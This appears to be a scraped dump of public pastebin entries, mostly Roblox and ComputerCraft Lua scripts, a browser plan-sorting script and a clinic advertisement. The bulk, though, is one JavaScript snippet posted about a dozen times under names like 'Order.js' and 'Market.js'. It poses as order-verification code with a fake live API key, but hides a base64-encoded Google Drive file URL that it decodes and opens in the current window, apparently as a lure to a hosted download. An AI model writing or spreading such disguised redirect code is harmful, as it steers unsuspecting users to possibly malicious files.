	scale_component_to_base_resolution[component] = base_resolution
end

local function register_scrolling_frame_layout_component(layout_component: scrolling_frame_layout_component)
	local scale_component_referral = layout_component:FindFirstChild(""scale_component_referral"")
	assert(scale_component_referral:IsA(""ObjectValue""))
	assert(scale_component_referral.Value ~= nil)
	assert(scale_component_referral.Value:IsA(""UIScale""))
	local scale_component: UIScale = scale_component_referral.Value
	local scrolling_frame = layout_component.Parent
	assert(scrolling_frame ~= nil)
	assert(scrolling_frame:IsA(""ScrollingFrame""))
	-- https://devforum.roblox.com/t/automaticcanvassize-working-with-uilistlayout-and-uiscale-causes-wrong-automatic-size/1334861.
	layout_component_to_rescaling_connection[layout_component] = layout_component:GetPropertyChangedSignal(
		""AbsoluteContentSize""
	):Connect(function()
		scrolling_frame.CanvasSize = UDim2.fromOffset(
			layout_component.AbsoluteContentSize.X / scale_component.Scale,
			layout_component.AbsoluteContentSize.Y / scale_component.Scale
		)
	end)
	scrolling_frame.CanvasSize = UDim2.fromOffset(
		layout_component.AbsoluteContentSize.X / scale_component.Scale,
		layout_component.AbsoluteContentSize.Y / scale_component.Scale
	)
	print('set')
end

local function initialize()
	assert(has_initialized == false)
	has_initialized = true

	collection_service:GetInstanceAddedSignal(""scale_component""):Connect(function(object: Instance)
		assert(object:IsA(""UIScale""))

		register_scale(object)
		rescale(object, scale_component_to_base_resolution[object])
	end)
	collection_service:GetInstanceRemovedSignal(""scale_component""):Connect(function(object: Instance)
		assert(object:IsA(""UIScale""))
		scale_component_to_base_resolution[object] = nil
	end)

	for _, object in collection_service:GetTagged(""scale_component"") do
		assert(object:IsA(""UIScale""))

		register_scale(object)
	end

	collection_service:GetInstanceAddedSignal(""scrolling_frame_layout_component""):Connect(function(object: Instance)
		assert(object:IsA(""UIGridStyleLayout"") or object:IsA(""UIListLayout""))
		register_scrolling_frame_layout_component(object)
	end)
	for _, object in collection_service:GetTagged(""scrolling_frame_layout_component"") do
		assert(object:IsA(""UIGridStyleLayout"") or object:IsA(""UIListLayout""))
		register_scrolling_frame_layout_component(object)
	end
	collection_service:GetInstanceRemovedSignal(""scrolling_frame_layout_component""):Connect(function(object: Instance)
		assert(object:IsA(""UIGridStyleLayout"") or object:IsA(""UIListLayout""))
		local rescaling_connection = layout_component_to_rescaling_connection[object]
		assert(rescaling_connection ~= nil)
		rescaling_connection:Disconnect()
		layout_component_to_rescaling_connection[object] = nil
	end)

	camera:GetPropertyChangedSignal(""ViewportSize""):Connect(rescale_all)
	rescale_all()
end

initialize()"
NkAVMY4T,Untitled,jm33,JavaScript,Monday 14th of April 2025 03:00:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78727/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XB0crMnx,Datastore Script!,Cakey3101,Lua,Monday 14th of April 2025 02:59:11 AM CDT,"local DataStoreService = game:GetService(""DataStoreService"")
local Players = game:GetService(""Players"")

local DataStore = DataStoreService:GetDataStore(""Data"")

Players.PlayerAdded:Connect(function(Player: Player)
	local leaderstats = Instance.new(""Folder"", Player)
	leaderstats.Name = ""leaderstats""

	local cash = Instance.new(""NumberValue"", leaderstats)
	cash.Name = ""Cash""
	
	local data
	local success, errorMessage = pcall(function()
		data = DataStore:GetAsync(Player.UserId..""-cash"")
	end)
	
	if success then
		cash.Value = data
	else
		print(""There Was An Error Whilst Getting Your Data!"")
		warn(errorMessage)
	end
end)

Players.PlayerRemoving:Connect(function(Player: Player)
	local success, errorMessage = pcall(function()
		DataStore:SetAsync(Player.UserId..""-cash"", Player.leaderstats.Cash.Value)
	end)
	
	if success then
		print(""Data Successfully Saved!"")
	else
		print(""There Was An Error Saving Data"")
		warn(errorMessage)
	end
end)"
mP4XVWKV,Products.js,jm33,JavaScript,Monday 14th of April 2025 02:45:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WVDExnxp,Order.js,jm33,JavaScript,Monday 14th of April 2025 02:28:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82929/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
022CgTyM,自制激光制导 no miner offset 可用,jaklsfjlsak,Lua,Monday 14th of April 2025 02:20:48 AM CDT,"local ship = peripheral.find(""warpdriveShipCore"")
local lasers = peripheral.getNames()

for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

          ship_front, ship_right, ship_up = ship.dim_positive()
  		  ship_back, ship_left, ship_down = ship.dim_negative()
		  ship_isInHyper = ship.isInHyperspace()
		  ship_movement = { ship.movement() }
  		  ship_rotationSteps = ship.rotationSteps()

print(""Emit Scanning Laser to Jump Ship and Aligning the Mining Laser"")

while true do
    local event, laserName, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()

    if event == ""laserScanning"" then
        lastLx, lastLy, lastLz = tonumber(lx), tonumber(ly), tonumber(lz)
        print(""Jumpinig to X:"" .. tonumber(lx) .. "", Z:"" .. tonumber(lz))
        
        local rx, ry, rz = ship.getOrientation()
        minForwardBack = math.abs(ship_front+ship_back+1)
        minLeftRight = math.abs(ship_left+ship_right+1)
		local mx, my, mz = ship.getLocalPosition()
            dx = lastLx-mx
            dz = lastLz-mz
        
        forwardBackMov = 0
        leftRightMov = 0
 
        if rx == 1 then
            forwardBackMov = dx
            leftRightMov = dz
        elseif rx == -1 then
            forwardBackMov = -dx
            leftRightMov = -dz
        elseif rz == 1 then
            forwardBackMov = dz
            leftRightMov = -dx
        elseif rz == -1 then
            forwardBackMov = -dz
            leftRightMov = dx
        end
 
        if math.abs(forwardBackMov) < minForwardBack and math.abs(leftRightMov) < minLeftRight then
            print(""The movement is too small!"")
		else
    
 
        leftRightMov = leftRightMov*1
            ship.movement(forwardBackMov, 0, leftRightMov)
            ship.rotationSteps(0)
            ship.command(""MANUAL"", true)
 end
        end
    end

        "
A60K4giD,Market.js,jm33,JavaScript,Monday 14th of April 2025 02:13:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19481/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SkwaUQ16,Untitled,jm33,JavaScript,Monday 14th of April 2025 01:57:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72372/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FzaVC7QX,Varicose vein treatment,usveinclinics,HTML,Monday 14th of April 2025 01:48:19 AM CDT,"At USA Vein Clinics in Fort Myers, we specialize in treating spider veins and varicose veins using advanced, minimally invasive procedures. Our experienced vein specialists are dedicated to helping you find relief from symptoms like leg pain, swelling, and visible veins. We offer FDA-approved treatments such as sclerotherapy and endovenous laser therapy (EVLT) in a comfortable outpatient setting.  Schedule your consultation today with a trusted spider vein specialist in Fort Myers.
https://www.usaveinclinics.com/company/locations/florida/fort-myers/office/fort-myers/"
VLvffp1E,三维 激光制导跳船 gpt,jaklsfjlsak,Lua,Monday 14th of April 2025 01:44:30 AM CDT,"local ship = peripheral.find(""warpdriveShipCore"")
local lasers = peripheral.getNames()

-- Filter for warpdriveLaserCameras and set their beam frequency.
for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

-- Define the offset distance (in blocks).
local offsetDistance = 18
-- Set invert to true if your testing shows the ship moves in the opposite direction
-- than expected along the X and Z axes.
local invert = true

print(""Auto Navigation System Online"")
print(""Offset Distance = "" .. offsetDistance)
if invert then
    print(""Using inverted offset calculation (moving to the opposite side from the ship)."")
else
    print(""Using standard offset calculation (moving from target toward ship)."")
end

while true do
    local event, laserName, lx, ly, lz = os.pullEvent(""laserScanning"")
    
    -- Convert target coordinates to numbers.
    local targetX = tonumber(lx)
    local targetY = tonumber(ly)
    local targetZ = tonumber(lz)
    print(""LaserScanning event received:"")
    print(""Target: ("" .. targetX .. "", "" .. targetY .. "", "" .. targetZ .. "")"")
    
    -- Get current ship core position.
    local currentX, currentY, currentZ = ship.getLocalPosition()
    
    -- Calculate the vector from the target to the ship.
    local dx = currentX - targetX
    local dy = currentY - targetY
    local dz = currentZ - targetZ
    
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    if distance == 0 then
      print(""Warning: The ship and target are at the same location. Skipping movement."")
    else
      -- Compute the unit vector from target to ship.
      local ux = dx / distance
      local uy = dy / distance
      local uz = dz / distance

      local newX, newY, newZ
      if invert then
         -- If invert is true, choose the point on the opposite side of the target.
         newX = targetX - ux * offsetDistance
         newY = targetY - uy * offsetDistance
         newZ = targetZ - uz * offsetDistance
      else
         -- Otherwise, choose the point from the target toward the ship.
         newX = targetX + ux * offsetDistance
         newY = targetY + uy * offsetDistance
         newZ = targetZ + uz * offsetDistance
      end

      -- Round the new coordinates to whole numbers.
      newX = math.floor(newX + 0.5)
      newY = math.floor(newY + 0.5)
      newZ = math.floor(newZ + 0.5)

      print(""New ship target position (rounded): ("" .. newX .. "", "" .. newY .. "", "" .. newZ .. "")"")

      -- Determine the movement delta.
      local moveX = newX - currentX
      local moveY = newY - currentY
      local moveZ = newZ - currentZ

      ship.movement(moveX, moveY, moveZ)
      ship.rotationSteps(0)
      ship.command(""MANUAL"", true)
      print(""Ship commanded to move by ("" .. moveX .. "", "" .. moveY .. "", "" .. moveZ .. "")"")
    end
end
"
eekDV00F,Products.js,jm33,JavaScript,Monday 14th of April 2025 01:42:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71775/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KG4JQrM7,Order.js,jm33,JavaScript,Monday 14th of April 2025 01:26:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63214/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JW1cxQ29,Screen,B0rdga,JSON,Monday 14th of April 2025 01:21:21 AM CDT,"{  ""id"": 5375,   ""mac"": """",   ""password"": ""1111-1111-1111-1111"",   ""startPackage"": ""2025-04-14T06:17:32.000Z"",   ""ExipiredAt"": ""2025-04-29 06:17:32"",   ""status"": 1,   ""type"": 1,   ""country"": ""SA"",   ""created_at"": ""2025-04-14T06:17:32.000Z"",   ""updated_at"": ""2025-04-14T06:17:32.000Z"",   ""version"": ""14"",   ""is_started"": 0,   ""info"": null,   ""serial_number"": null,   ""remember_token"": null,   ""apps"": ""screen"",   ""clientIP"": ""82.167.81.106"",   ""userAgent"": ""okhttp/4.11.0"",   ""deviceInfo"": null,   ""playlist"": [  ],   ""message"": ""Coupon is not valid"",   ""validation"": true }"
8VEGftxa,Jio Recharges Scraper - 1,jraavis,JavaScript,Monday 14th of April 2025 01:13:57 AM CDT,"document.addEventListener(""click"", function() {
  // Cleanup existing elements
  document.querySelectorAll('[class^=""PlanName_planText__""] div span').forEach((e) => e.remove());
  
  // Select all plan cards
  const planCards = document.querySelectorAll('.Details_planCardBody__2J7AF');
  const plans = [];

  // Collect plan data
  planCards.forEach((planContainer) => {
    const priceElement = planContainer.querySelector('.PlanName_planText__3e7m1 div');
    const validityElement = planContainer.querySelector('.ValidityCol_gridItem__2kXe3 div.j-text.j-text-body-xxs-bold span');
    
    const price = parseInt(priceElement.textContent.trim(), 10);
    const validityDays = parseInt(validityElement.textContent.trim().split(' ')[0], 10);
    const pricePerDay = price / validityDays;

    plans.push({
      price,
      validityDays,
      pricePerDay,
      element: planContainer.cloneNode(true) // Clone original element
    });
  });

  // Sort plans by pricePerDay (ascending)
  plans.sort((a, b) => a.pricePerDay - b.pricePerDay);

  // Create results container
  const resultsContainer = document.createElement('div');
  resultsContainer.style.marginTop = '20px';
  resultsContainer.innerHTML = '';
  resultsContainer.style.width = '100%';

  // Create sorted list
  const listContainer = document.createElement('div');
  plans.forEach(plan => {
    const planItem = document.createElement('div');
    planItem.style.padding = '10px';
    planItem.style.borderBottom = '1px solid #eee';
    planItem.style.width = '400px';
    planItem.innerHTML = `
      <div style=""display: flex; justify-content: space-between;"">
        <div class=""price"">₹${plan.price} (${plan.validityDays} days)</div>
        <div class=""price-per-day"">₹${plan.pricePerDay.toFixed(2)}/day</div>
      </div>
    `;
    listContainer.appendChild(planItem);
  });

  // Update headingCategory div
  const headingDiv = document.querySelector('#headingCategory');
  headingDiv.innerHTML = ''; // Clear previous content
  resultsContainer.innerHTML = '';
  resultsContainer.appendChild(listContainer);
  headingDiv.appendChild(resultsContainer);
});"
pRNM5c4z,Market.js,jm33,JavaScript,Monday 14th of April 2025 01:11:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02424/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mhQFr8b8,集成尝试 4/13,jaklsfjlsak,Lua,Monday 14th of April 2025 12:59:08 AM CDT,"print(""Press M to Activate Horizontal Mining System, Press J to Activate Laser Guided Warp System"")

if not fs.exists(""jzc"") then
    shell.run(""pastebin get rfXW7SiN jzc"")
    term.clear()
end
if not fs.exists(""ztc"") then
    shell.run(""pastebin get S9SW0zHJ ztc"")
    term.clear()
end

while true do
    local event, key = os.pullEvent(""key"")
    -- Use keys.m and keys.j instead of hardcoding 77 and 74.
    if key == keys.m then
        print(""Booting Horizontal Mining System..."")
        shell.run(""jzc"")
    elseif key == keys.j then
        print(""Booting Laser Guided Warp System..."")
        shell.run(""ztc"")
    end
end
"
Gede7FZY,Untitled,jm33,JavaScript,Monday 14th of April 2025 12:56:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71371/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
a7e7tPYu,Market.js,zebmekey,JavaScript,Monday 14th of April 2025 12:40:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85791/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7Yuxhfmm,Untitled,zebmekey,JavaScript,Monday 14th of April 2025 12:24:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27912/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
